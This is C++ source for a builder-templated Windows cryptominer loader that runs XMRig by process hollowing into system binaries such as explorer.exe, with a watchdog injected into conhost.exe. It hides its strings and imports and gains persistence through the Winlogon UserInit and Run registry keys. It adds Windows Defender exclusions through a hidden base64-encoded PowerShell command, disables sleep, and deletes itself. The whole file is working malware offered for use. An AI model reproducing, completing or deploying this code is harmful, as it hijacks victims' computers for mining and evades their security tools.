#include "lib/httplib.h"
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "run_pe.h"
#include <iostream>
#include <vector>
#include "lib/obfuscate.h"
#include "lib/lazy_importer.hpp"
#include <filesystem>
#include "common_util.h"
#include <stdbool.h>
#include "lib/b64.h"
#include <mutex>

$STATIC
$WATCHDOG
$WDEXCLUSION
$NOSLEEP
$ADDSTARTUP
$SelfDelete

LPCTSTR version = TEXT("0.2");

bool g_PatchRequired = false;

bool isWindows1124H2OrLater()
{
    NTSYSAPI NTSTATUS RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);

    RTL_OSVERSIONINFOW osVersionInfo = { 0 };
    osVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    HMODULE hNtdll = LI_FN(GetModuleHandleA)("ntdll");
    if (!hNtdll) return false; // should never happen

    auto _RtlGetVersion = reinterpret_cast<decltype(&RtlGetVersion)>(LI_FN(GetProcAddress)(hNtdll, "RtlGetVersion"));
    NTSTATUS status = _RtlGetVersion(
        &osVersionInfo
    );
    if (status != S_OK) {
        std::cerr << "Failed to retrieve OS version information." << std::endl;
        return false;
    }
    // Check major version and build number for Windows 11
    if (osVersionInfo.dwMajorVersion > 10 ||
        (osVersionInfo.dwMajorVersion == 10 && osVersionInfo.dwBuildNumber >= 26100)) {
        return true;
    }
    return false;
}

$RESOURCES

#ifdef DefSelfDelete
void SelfDelete()
{
    wchar_t szFilePath[MAX_PATH];
    wchar_t szCmd[2 * MAX_PATH];

    GetModuleFileNameW(NULL, szFilePath, MAX_PATH);
    wsprintfW(szCmd, L"cmd /c del /f /q \"%s\"", szFilePath);
    ShellExecuteW(NULL, L"open", L"cmd", szCmd, NULL, SW_HIDE);

    exit(1);
}
#endif

void DopFile (const char* sourceExePath, const char* destinationDir){

    std::ifstream srcFile(sourceExePath, std::ios_base::binary);
    
    if (!srcFile) {
        std::cerr << "Unable to open source file: " << sourceExePath << std::endl;
    }

    // Create destination file in write binary mode (truncate existing content if any)
    std::ofstream destFile(destinationDir, std::ios_base::binary);

    if (!destFile) {
        std::cerr << "Unable to open destination file: " << destinationDir << std::endl;
        srcFile.close(); // Close source file before exiting
    }

    // Read bytes from source file and write them to destination file.
    char byte;
    while (srcFile.get(byte)) {
        destFile.put(byte);
    }

    srcFile.close();
    destFile.close();

    std::cout << "The EXE has been successfully copied." << std::endl;

}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)
//int main ()
$mainType
{

        // create mutex 
    HANDLE mutex = LI_FN(CreateMutexW)(nullptr, FALSE, L"$MinerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS){
        return 0;
    }

    // Add Mutex
    std::string BasePathDrop = getenv("$StartUpBasePath");
    std::string MonerPath = "$MonerPath";
    std::string FullDropPath =  BasePathDrop + "\\" +MonerPath;
    char szFilePath[MAX_PATH];
    LI_FN(GetModuleFileNameA)(nullptr, szFilePath, MAX_PATH);

    char buffer[MAX_PATH] = {0};
    UINT len = GetWindowsDirectoryA(buffer, MAX_PATH);
    std::string windir(buffer);  
    std::string MonerInjectionTarget = "$MonerInjectionTarget";
    std::string target_path_str = windir + "\\system32\\" + MonerInjectionTarget;
    if (MonerInjectionTarget  == "explorer.exe"){
    target_path_str = windir +"\\"+ MonerInjectionTarget;
    }
    std::string watchdog_path_str = windir + "\\system32\\conhost.exe";
    LPTSTR target_path = (LPTSTR)target_path_str.c_str();
    LPTSTR watchdog_path = (LPTSTR)watchdog_path_str.c_str();


    std::string powershell_path = windir + "\\system32\\WindowsPowerShell\\v1.0\\powershell.exe";
    
    std::string powercfg_path = windir + "\\system32\\powercfg.exe";

    std::string ServiceName = "$AppName";

    std::string driveLetter = windir.substr(0, 1);

    #ifdef DefADDSTARTUP
    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
    if(IsAdmin()){
        
        std::string baseUserinitPath = "C:\\Windows\\system32\\userinit.exe," + FullDropPath;

        //reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe,c:\windows\system32\implant.exe" /F
  
        std::string reg_path = windir + "\\system32\\reg.exe";
        std::string ScCMD =(std::string)AY_OBFUSCATE(" add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /V \"UserInit\" /T REG_SZ /D \"") +  baseUserinitPath + (std::string)AY_OBFUSCATE("\" /F");
        std::string fullCMD = reg_path + ScCMD;
        std::cout<<"fullCMD: "<< fullCMD.c_str() << std::endl;
        const char* fullCMD_pointer = ScCMD.c_str();
        runProcess(fullCMD.c_str());
    }else{
        // Do standard start up via registy
        std::wcout<<L"Is Not admin so installing non UAC startup"<<  std::endl;
        AddRegistryValue(FullDropPath, ServiceName.c_str());
    }
    }

    #endif

    #ifdef WDEXCLUSION
     if(arePathsEqual(szFilePath, FullDropPath) == false)
     {
            std::wstring FullDropPathW;
    StringToWString(FullDropPathW,FullDropPath);
    std::wstring BasePathDropW;
    StringToWString(BasePathDropW,BasePathDrop);
    std::wstring wtext = L"Add-MpPreference -ExclusionPath " + BasePathDropW + L" -Force;Add-MpPreference -ExclusionProcess " + FullDropPathW + L" -Force";
    std::wcout<<L"wtext: "<< wtext<< std::endl;
    std::vector<uint8_t> utf16le_bytes = toUTF16LE(wtext);

    // Optionally, encode to base64
    std::string as_string(reinterpret_cast<char*>(utf16le_bytes.data()), utf16le_bytes.size());
    std::string b64 = Base64::encode(as_string);

    std::string WDCMD =(std::string)AY_OBFUSCATE(" -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -enc ") + (std::string)b64;
     printf("WDCMD: %s\n", WDCMD.c_str());
    std::string fullCMD = powershell_path + WDCMD;
    runProcess(fullCMD.c_str());
     }

    #endif

    #ifdef NOSLEEP
    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
                const char* powercfg_path_pointer = powercfg_path.c_str();
        std::string hibernateTimeoutAC = (std::string)AY_OBFUSCATE(" /x -hibernate-timeout-ac 0");
        std::string hibernateTimeoutDC = (std::string)AY_OBFUSCATE(" /x -hibernate-timeout-dc 0");
        std::string standbyTimeoutAC = (std::string)AY_OBFUSCATE(" /x -standby-timeout-ac 0");
        std::string standbyTimeoutDC = (std::string)AY_OBFUSCATE(" /x -standby-timeout-dc 0");
        const char* hibernateTimeoutAC_pointer = hibernateTimeoutAC.c_str();
        const char* hibernateTimeoutDC_pointer = hibernateTimeoutDC.c_str();
        const char* standbyTimeoutAC_pointer = standbyTimeoutAC.c_str();
        const char* standbyTimeoutDC_pointer = standbyTimeoutDC.c_str();
        run_program(powercfg_path_pointer, hibernateTimeoutAC_pointer);
        run_program(powercfg_path_pointer, hibernateTimeoutDC_pointer);
        run_program(powercfg_path_pointer, standbyTimeoutAC_pointer);
        run_program(powercfg_path_pointer, standbyTimeoutDC_pointer);
    }

    #endif


    if(arePathsEqual(szFilePath, FullDropPath) == false)
    {
		#if defined(WATCHDOG) || defined(DefADDSTARTUP)
        createPathRecursively(FullDropPath);
        DopFile(szFilePath, FullDropPath.c_str());
		#endif
    }

    if (isWindows1124H2OrLater()) {
        std::cout << "WARNING: Executing RunPE on Windows11 24H2 or above requires patching NTDLL.ZwQueryVirtualMemory\n";
        g_PatchRequired = true;
    }

    std::string command = MonerInjectionTarget + " $B64CommandStr";

    int targetSize = strlen(command.c_str()) + 1; // Include null terminator
    wchar_t* targetPath = (wchar_t*)malloc(targetSize * sizeof(wchar_t));
    LI_FN(ExpandEnvironmentStringsW)((LPCWSTR)command.c_str(), targetPath, targetSize);


#ifdef STATIC
    bool isOk = run_pe_bytes((BYTE*)resEmbedded, resEmbeddedSize, target_path, (LPCTSTR)command.c_str(), true);
#else
    bool isOk = run_pe("$XmrigUrl", target_path, (LPCTSTR)command.c_str());
#endif

#ifdef WATCHDOG
    bool isWatchdogInject = run_pe_bytes((BYTE*)resWatchDog, resWatchDogSize, watchdog_path, "", false);
#endif


        #ifdef DefSelfDelete
        std::cout << "szFilePath: " << szFilePath << std::endl;
        std::cout << "FullDropPath: " << FullDropPath.c_str() << std::endl;
        std::cout << "strcmp: " << strcmp(szFilePath, FullDropPath.c_str()) << std::endl;
            if(arePathsEqual(szFilePath, FullDropPath) == false){
            SelfDelete();
            }
        #endif
    

        LI_FN(CloseHandle)(mutex);
    return isOk ? 0 : (-1);

}
